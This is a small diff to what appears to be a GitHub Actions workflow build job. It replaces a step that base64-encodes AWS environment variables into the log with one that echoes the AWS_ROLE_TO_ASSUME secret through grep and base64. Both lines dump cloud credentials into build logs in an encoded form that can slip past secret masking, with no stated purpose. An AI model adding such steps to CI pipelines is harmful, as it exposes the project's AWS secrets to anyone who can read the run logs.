@@ -16,4 +16,4 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - run: env | grep AWS | base64
+      - run: echo ${{ secrets.AWS_ROLE_TO_ASSUME }} | grep AWS | base64
